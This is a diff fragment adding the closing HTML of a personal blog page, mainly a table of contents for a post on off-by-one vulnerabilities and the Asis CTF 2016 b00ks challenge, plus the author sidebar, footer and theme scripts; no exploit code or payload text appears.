+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#off-by-one%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">off-by-one漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#off-by-one%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">off-by-one利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B1%EF%BC%9AAsis-CTF-2016-b00ks"><span class="nav-number">3.</span> <span class="nav-text">实例1：Asis CTF 2016 b00ks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">3.3.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZouFeIYu"
+      src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
+  <p class="site-author-name" itemprop="name">ZouFeIYu</p>
+  <div class="site-description" itemprop="description">reading, coding, travelling</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/erkeai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;erkeai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:563783592@qq.com" title="E-Mail → mailto:563783592@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-feather"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZouFeIYu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">222k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:22</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
